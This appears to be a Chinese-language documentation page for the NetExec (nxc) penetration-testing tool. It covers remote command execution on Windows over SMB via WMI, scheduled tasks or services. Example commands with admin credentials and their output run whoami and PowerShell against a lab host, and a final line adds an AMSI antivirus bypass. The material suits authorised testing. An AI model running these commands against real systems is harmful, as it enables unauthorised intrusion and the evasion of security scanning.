# 执行远程命令

## 命令执行

在 Windows 系统上执行命令需要管理员凭证。

当认证成功且具有管理员权限时，nxc 会自动在输出中添加"(Pwn3d!)"（或你在配置中设置的其他值）来提示你。

## 执行方法

nxc 有三种不同的命令执行方法：

* `wmiexec` 通过 WMI 执行命令
* `atexec` 通过 Windows 任务计划程序调度任务来执行命令
* `smbexec` 通过创建和运行服务来执行命令

默认情况下，如果一种执行方法失败，nxc 会尝试使用其他方法。它按以下顺序尝试执行命令：

1. `wmiexec`
2. `atexec`
3. `smbexec`

如果你想强制 nxc 只使用一种执行方法，可以使用 `--exec-method` 参数指定。

## 执行命令

在下面的例子中，我们使用 `-x` 参数尝试在目标上执行 `whoami` 命令：

```
nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         lab\administrator
06-05-2016 14:34:39 [*] KTHXBYE!
```

你也可以使用 `-X` 参数直接执行 PowerShell 命令：

```
nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         Name                           Value
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         ----                           -----
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
06-05-2016 14:36:10 [*] KTHXBYE!
```

### 绕过 AMSI

```
nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
```
